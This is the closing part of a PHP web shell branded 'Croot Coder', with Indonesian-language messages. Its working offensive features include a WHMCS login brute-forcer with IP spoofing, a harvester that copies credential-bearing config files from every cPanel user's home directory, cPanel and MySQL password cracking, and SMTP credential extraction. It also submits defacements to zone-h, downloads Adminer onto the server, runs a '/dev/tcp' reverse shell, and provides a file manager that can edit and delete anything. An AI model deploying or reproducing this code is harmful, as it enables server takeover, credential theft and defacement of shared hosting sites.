        $private_ips = array(array("0.0.0.0", "2.255.255.255"), array("10.0.0.0", "10.255.255.255"), array("127.0.0.0", "127.255.255.255"), array("169.254.0.0", "169.254.255.255"), array("172.16.0.0", "172.31.255.255"), array("192.0.2.0", "192.0.2.255"), array("192.168.0.0", "192.168.255.255"), array("255.255.255.0", "255.255.255.255")); 
        foreach ($private_ips as $r) { 
            $min = ip2long($r[0]); 
            $max = ip2long($r[1]); 

            if ($min <= ip2long($ip) && ip2long($ip) <= $max) { 
                return false; 
                continue; 
            } 
        } 

        return true; 
    } 

    return false; 
} 
function login($url,$user,$pass){ 
    global $ip; 

    $post = array('username'=>$user,'password'=>$pass,'rememberme'=>'on'); 

    $ch = curl_init(); 
    curl_setopt($ch,CURLOPT_URL,"$url/dologin.php"); 
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false); 
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false); 
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); 
    curl_setopt($ch,CURLOPT_HTTPHEADER,array("CLIENT-IP: $ip")); 
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; rv:17.0) Gecko/20100101 Firefox/17.0'); 
    curl_setopt($ch,CURLOPT_POST,true); 
    curl_setopt($ch,CURLOPT_POSTFIELDS,$post); 
    curl_setopt($ch,CURLOPT_HEADER,true); 
    curl_setopt($ch,CURLOPT_REFERER,"$url/login.php"); 
    $return = curl_exec($ch); 
    curl_close($ch); 
    //echo $return; 
    if(preg_match('/Location\: index\.php/',$return)){ 
        return true; 
    }else{ 
        return false; 
    } 
} 
if($_POST['start']){ 
$fp=fopen("HsH-whmcs.txt","a+"); 


 foreach(explode("\n",$_POST['site']) as $site){ 
   $site=trim($site); 
foreach(explode("\n",$_POST['user']) as $user){ 
    $user = trim($user); 
    foreach(explode("\n",$_POST['pass']) as $pass){ 
        $pass = trim($pass); 
        echo "<font color='lime'><br>Scann $site | $user | $pass<br></font> "; 

        while (true) { 
            $ip = long2ip(rand(11111,99999999999)); 
            if(!@in_array($ip,$ips)&&check_ip($ip)){ 
                $ips[] = $ip; 
                break; 
            } 
        } 

        if(login($site,$user,$pass)){ 
            echo "<center><font size='5' color='aqua'><br>[+] $site <br> [+]user : $user.<br> password:$pass\n<br></font></center>"; 

            fwrite($fp,"Target : $site\r\nUsername : $user\r\nPassword : $pass\r\n===================================\r\n"); 
            break; 
        }else{ 
            echo "Ora Kenek COK \n"; 
        } 
    } 
} 
} 


    } 

exit;
}

if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
		} else {
			$act = "<font color=red>failed to upload file</font>";
		}
	}
	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r");
	$croot = mkdir("Croot-Config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("Croot-Config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_croot) {
				$user_config_dir = "/home/$user_croot/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_croot/.my.cnf" => "cpanel",
						"/home/$user_croot/.accesshash" => "WHM-accesshash",
						"/home/$user_croot/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_croot/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_croot/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_croot/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_croot/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_croot/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_croot/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_croot/public_html/forum/config.php" => "phpBB",
						"/home/$user_croot/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_croot/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_croot/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_croot/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_croot/public_html/configuration.php" => "Joomla",
						"/home/$user_croot/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_croot/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_croot/public_html/wp-config.php" => "WordPress",
						"/home/$user_croot/public_html/admin/config.php" => "OpenCart",
						"/home/$user_croot/public_html/slconfig.php" => "Sitelok",
						"/home/$user_croot/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("Croot-Config/$user_croot-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/Croot-Config'><font color=lime><p class='blink'>Berhasil Buat Croot-Config</p></font></a></center>";
} elseif($_GET['do'] == 'nginceng') {
	$i = 0;
	echo "<center><pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_nginceng);
			foreach($user_nginceng[1] as $user_croot_nginceng) {
				$user_nginceng_dir = "/home/$user_croot_nginceng/public_html";
				if(is_readable($user_nginceng_dir)) {
					$i++;
					$jrw = "<font color=lime></font> <a href='?dir=$user_nginceng_dir'><font color=aqua>$user_nginceng_dir</font></a>";
					if(is_writable($user_nginceng_dir)) {
						$jrw = "[<font color=lime>*</font>] <a href='?dir=$user_nginceng_dir'><font color=lime>$user_nginceng_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_nginceng = file_get_contents("/etc/named.conf");	
						if($domain_nginceng == '') {
							echo " &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color=red>Jancok Nama Domaine Oraiso Ditokne</font> <br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_nginceng, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_nginceng_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_nginceng_url = $user_nginceng_url['name'];
								if($user_nginceng_url == $user_croot_nginceng) {
									echo " &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <u>$dj</u> <br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Ngintip ".$i." Janda Lagi Telanjang Di Room ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre></center>";
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Sukses Nloco ".$i." Cpanel by <font color=lime>Croot Coder.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form><br>
		<span><font color=lime><p class='blink'>Harus Di Lokasi Folder /Croot-Config/ </p></font></span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span><p class='blink'>Jalankan di dalam folder Croot-Config </p></span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Croot Coder'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/Croot/", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='croot.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan ' style='width: 450px;'>
		</form><br>
		 </center>";
	}
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='adminer.php' target='_blank'><p class='blink'>adminer login </p></a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'network') {
	echo "<center><form method='post'>
	Back Connect: <br>
	<input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
	<input type='text' placeholder='port' name='port_bc' value='433'><br>
	<input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
	</form>";
	if(isset($_POST['sub_bc'])) {
		$ip = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	}
	echo "</center>";
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} else {
	if(is_dir($dir) == true) {
		echo '<hr><table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Nama</center></th>
		<th class="th_home"><center>Jenis</center></th>
		<th class="th_home"><center>Ukuran</center></th>
		<th class="th_home"><center>Tanggal</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Pilihan</center></th>
		</tr><hr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img src='https://2.bp.blogspot.com/-An5JJ5J2fGw/WCDrNPun3TI/AAAAAAAAAVU/j_zcs7zPqf0NT8yRd6qDrft5iHnNp5ewACLcB/s1600/diamond.png'>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='https://2.bp.blogspot.com/-PLUIIXu9Q5I/WCD2STVa4xI/AAAAAAAAAWE/Ma5hoEJy1WEWilv008FZbKhfLHqQTwHXgCLcB/s1600/xx.gif'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></table><hr>";
	} else {
		echo "<font color=red>can't open directory</font>";
	}
}

?>
<script language="JavaScript1.2">
function ClearError() {return true;}
window.onerror = ClearError;
</script><hr>
<h1><font class="hk2' style="text-shadow: 1px -1px 8px;"font face="Lucida Console"><center><SCRIPT>
farbbibliothek = new Array(); 
farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100"); 
farbbibliothek[1] = new Array("aqua","black","aqua","black","aqua"); 
farbbibliothek[2] = new Array("#FFFFFF","blue","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF"); 
farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040"); 
farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000"); 
farbbibliothek[5] = new Array("lime","black","lime","black",";ime","black"); 
farbbibliothek[6] = new Array("aqua","black"); 
farben = farbbibliothek[4];
function farbschrift() 
{ 
for(var i=0 ; i<Buchstabe.length; i++) 
{ 
document.all["a"+i].style.color=farben[i]; 
} 
farbverlauf(); 
} 
function string2array(text) 
{ 
Buchstabe = new Array(); 
while(farben.length<text.length) 
{ 
farben = farben.concat(farben); 
} 
k=0; 



while(k<=text.length) 



{ 



Buchstabe[k] = text.charAt(k); 



k++; 



} 



} 



function divserzeugen() 



{ 



for(var i=0 ; i<Buchstabe.length; i++) 



{ 



document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>"); 



} 



farbschrift(); 



} 



var a=1; 



function farbverlauf() 



{ 



for(var i=0 ; i<farben.length; i++) 



{ 



farben[i-1]=farben[i]; 



} 



farben[farben.length-1]=farben[-1]; 







setTimeout("farbschrift()",30); 



} 



// 



var farbsatz=1; 



function farbtauscher() 



{ 



farben = farbbibliothek[farbsatz]; 



while(farben.length<text.length) 



{ 



farben = farben.concat(farben); 



} 



farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001)); 



} 



setInterval("farbtauscher()",2000); 



text =" Copyright @ Croot Coder  ";//h 



string2array(text);



divserzeugen(); 



//document.write(text); 




</SCRIPT></center></h1></font>
<hr/>
</html>
